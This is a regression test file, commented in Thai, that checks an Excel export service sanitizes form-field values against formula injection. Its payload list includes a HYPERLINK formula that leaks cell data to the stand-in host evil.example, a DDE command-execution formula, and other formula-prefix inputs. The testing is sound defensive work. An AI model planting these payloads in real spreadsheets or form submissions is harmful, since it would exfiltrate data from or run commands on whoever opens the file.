/**
 * Regression: Excel Formula Injection — ทุก string cell ต้องผ่าน sanitizeCell
 * ===========================================================================
 *
 * ก่อนแก้: sanitizeCell ครอบเฉพาะ TEXT/TEXTAREA/legacy string/FILE แต่ค่าจาก
 * formData ของ RADIO / DROPDOWN / CHECKBOX (array) / MASTER_DATA (object/array)
 * และทางผ่าน other-option (formatFieldValueWithOther, replaceOtherInDisplay)
 * ถูกเขียนลง cell ดิบ ๆ — ผู้สมัครใส่ "=HYPERLINK(...)" ลงช่องใดก็ได้แล้วค่า
 * นั้น execute ตอน admin เปิดไฟล์ export
 *
 * หลังแก้: transformFieldValue ครอบ sanitizeCell ทุก return path ของ string
 *
 * Run: node --import tsx src/services/__tests__/excel-formula-injection.test.ts
 */

// @ts-nocheck — tsx run-time; keep simple, no project type plumbing
import { transformFieldValue } from '../excel-export.service';

let passed = 0;
let failed = 0;
const failures: string[] = [];

function assertSafe(value: unknown, label: string) {
  if (typeof value !== 'string') return; // NUMBER cell จริงเป็น number — ไม่มี formula
  if (/^[=+\-@\t\r]/.test(value)) {
    throw new Error(`${label}: ค่า "${value}" ขึ้นต้นด้วยอักขระ formula และไม่ถูก sanitize`);
  }
}

async function test(name: string, fn: () => Promise<void> | void) {
  try {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (e) {
    failed++;
    failures.push(`${name}: ${e?.message ?? e}`);
    console.log(`  ✗ ${name}: ${e?.message ?? e}`);
  }
}

const PAYLOADS = [
  '=HYPERLINK("http://evil.example/leak?d="&A1&"","Summary")',
  '=cmd|\'/C calc\'!A0',
  '+SUM(1+1)',
  '-2+3',
  '@SUM(1+1)',
  '\t=1+1',
  '\r=1+1',
];

async function runAllTests() {
  console.log('\n=== Excel Formula Injection — ทุก type ต้อง sanitize ===\n');

  for (const payload of PAYLOADS) {
    await test(`RADIO — "${payload.slice(0, 24)}…"`, () => {
      assertSafe(transformFieldValue('RADIO', 'f1', { f1: payload }, null), 'RADIO');
    });
    await test(`DROPDOWN — "${payload.slice(0, 24)}…"`, () => {
      assertSafe(transformFieldValue('DROPDOWN', 'f1', { f1: payload }, null), 'DROPDOWN');
    });
    await test(`CHECKBOX array — "${payload.slice(0, 24)}…"`, () => {
      assertSafe(transformFieldValue('CHECKBOX', 'f1', { f1: [payload] }, null), 'CHECKBOX[]');
    });
    await test(`MASTER_DATA object — "${payload.slice(0, 24)}…"`, () => {
      assertSafe(transformFieldValue('MASTER_DATA', 'f1', { f1: { name: payload } }, null), 'MASTER_DATA{}');
    });
    await test(`MASTER_DATA array — "${payload.slice(0, 24)}…"`, () => {
      assertSafe(transformFieldValue('MASTER_DATA', 'f1', { f1: [payload] }, null), 'MASTER_DATA[]');
    });
  }

  // Other-option ทางผ่าน: ตัว choice เป็นค่าปกติ แต่ข้อความ "อื่นๆ" เป็น formula
  await test('RADIO other-text เป็น formula → ต้อง sanitize', () => {
    const out = transformFieldValue('RADIO', 'f1', { f1: 'อื่นๆ (โปรดระบุ)', f1__other: '=HYPERLINK("http://evil")' }, null);
    assertSafe(out, 'RADIO other-text');
  });
  await test('CHECKBOX other-text เป็น formula → ต้อง sanitize', () => {
    const out = transformFieldValue('CHECKBOX', 'f1', { f1: ['ตัวเลือก 1'], f1__other: '=cmd|\'/C calc\'!A0' }, null);
    assertSafe(out, 'CHECKBOX other-text');
  });

  // ค่าปกติต้องไม่ถูกเปลี่ยน (ไม่ prepend '  กับค่าที่ไม่ใช่ formula)
  await test('ค่าปกติ (ไทย/ตัวเลข string) ต้องคงเดิม', () => {
    const radio = transformFieldValue('RADIO', 'f1', { f1: 'บุรุษ' }, null);
    if (radio !== 'บุรุษ') throw new Error(`RADIO ปกติถูกแก้: ${radio}`);
    const master = transformFieldValue('MASTER_DATA', 'f1', { f1: { name: 'ตำแหน่ง วิศวกร' } }, null);
    if (master !== 'ตำแหน่ง วิศวกร') throw new Error(`MASTER_DATA ปกติถูกแก้: ${master}`);
    const checkbox = transformFieldValue('CHECKBOX', 'f1', { f1: ['A', 'B'] }, null);
    if (checkbox !== 'A, B') throw new Error(`CHECKBOX ปกติถูกแก้: ${checkbox}`);
  });

  console.log(`\n=== ${passed} passed, ${failed} failed ===`);
  if (failed > 0) {
    failures.forEach((f) => console.error(`  FAIL: ${f}`));
    process.exit(1);
  }
}

runAllTests().catch((e) => {
  console.error(e);
  process.exit(1);
});
